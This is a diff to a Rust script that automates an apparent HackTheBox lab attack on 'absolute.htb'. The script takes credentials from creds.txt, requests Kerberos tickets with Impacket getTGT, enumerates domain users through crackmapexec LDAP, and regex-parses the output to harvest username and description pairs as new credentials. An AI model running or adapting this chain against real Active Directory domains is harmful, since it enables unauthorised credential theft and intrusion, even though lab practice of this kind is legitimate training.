@@ -1,6 +1,8 @@
 use std::process::Command;
 use std::fs::{File, OpenOptions};
 use std::io::{Write, BufRead, BufReader, BufWriter};
+use console::strip_ansi_codes;
+use regex::Regex;
 
 pub fn run_impacket_gettgt_first_user() {
     let input_path = "creds.txt";
@@ -32,13 +34,11 @@ pub fn run_impacket_gettgt_first_user() {
             .arg(format!("export KRB5CCNAME={}", ccache_filename))
             .output()
             .expect("failed to execute export KRB5CCNAME command");
-
-        println!("{}", String::from_utf8_lossy(&export_output.stdout));
-        println!("{}", String::from_utf8_lossy(&export_output.stderr));
+        println!("Exported {}", ccache_filename);
     }
 }
 
-pub fn run_crackmapexec() -> String {
+pub fn run_crackmapexec() {
     // Read the first line from the creds.txt file
     let input_path = "creds.txt";
     let file = File::open(input_path).expect("Unable to open file");
@@ -48,27 +48,37 @@ pub fn run_crackmapexec() -> String {
 
     // Split the creds string by the colon and take the first part (username)
     let username = creds.split(':').next().unwrap_or("");
+    // Split the creds string by the colon and take the second part (password)
+    let password = creds.split(':').nth(1).unwrap_or("");
 
     // Prepare the crackmapexec command with the specified arguments
+    let output_file_path = "crackmapexec_LDAP_output.txt";
     let output = Command::new("crackmapexec")
         .arg("ldap")
         .arg("absolute.htb")
         .arg("-u")
         .arg(username)
-        .arg("-d")
-        .arg("absolute.htb")
+        .arg("-p")
+        .arg(password)
         .arg("-k")
-        .arg("--kdcHost")
-        .arg("dc.absolute.htb")
         .arg("--users")
         .output()
         .expect("failed to execute crackmapexec");
 
-    // Return the command output as a String
-    String::from_utf8_lossy(&output.stdout).to_string()
+    // Write the command output to the output file
+    let mut output_file = File::create(output_file_path).expect("Unable to create output file");
+    output_file.write_all(&output.stdout).expect("Unable to write to output file");
+    output_file.write_all(&output.stderr).expect("Unable to write to output file");
+
+    println!("CrackMapExec results saved to {}", output_file_path);
 }
 
-pub fn update_creds_file(crackmapexec_output: &str) {
+pub fn update_creds_file() {
+    // Open the crackmapexec_output.txt file
+    let output_file_path = "crackmapexec_LDAP_output.txt";
+    let output_file = File::open(output_file_path).expect("Unable to open output file");
+    let output_reader = BufReader::new(output_file);
+
     // Open creds.txt
     let file = OpenOptions::new()
         .append(true)
@@ -77,18 +87,23 @@ pub fn update_creds_file(crackmapexec_output: &str) {
 
     let mut file = BufWriter::new(file);
 
-    for line in crackmapexec_output.lines() {
-        if line.starts_with("LDAP absolute.htb") {
-            let parts: Vec<&str> = line.split_whitespace().collect();
-            if parts.len() >= 6 {
-                let username = parts[4];
-                let info = parts[5];
+    // Define the regex pattern
+    let pattern = Regex::new(r"(?i)LDAP\s+absolute\.htb\s+\d+\s+DC\s+(\S+)\s+(\S+)$").unwrap();
 
-                // Check if part[5] is not empty and is a single string
-                if !info.is_empty() && !info.contains(' ') {
-                    writeln!(&mut file, "{}:{}", username, info)
-                        .expect("Unable to write data to file");
-                }
+    for line in output_reader.lines() {
+        let line = line.expect("Unable to read line");
+        let line = strip_ansi_codes(&line);
+        let line = String::from(line);
+
+        if let Some(captured) = pattern.captures(&line) {
+            println!("Matched Lines {}", line);
+            let username = captured.get(1).unwrap().as_str();
+            let info = captured.get(2).unwrap().as_str();
+
+            // Check if part[5] is not empty and is a single string
+            if !info.is_empty() && !info.contains(' ') {
+                writeln!(&mut file, "{}:{}", username, info)
+                    .expect("Unable to write data to file");
             }
         }
     }
@@ -125,7 +140,6 @@ pub fn run_impacket_gettgt_second_user() {
             .output()
             .expect("failed to execute export KRB5CCNAME command");
 
-        println!("{}", String::from_utf8_lossy(&export_output.stdout));
-        println!("{}", String::from_utf8_lossy(&export_output.stderr));
+        println!("Exported {}", ccache_filename);
     }
 }
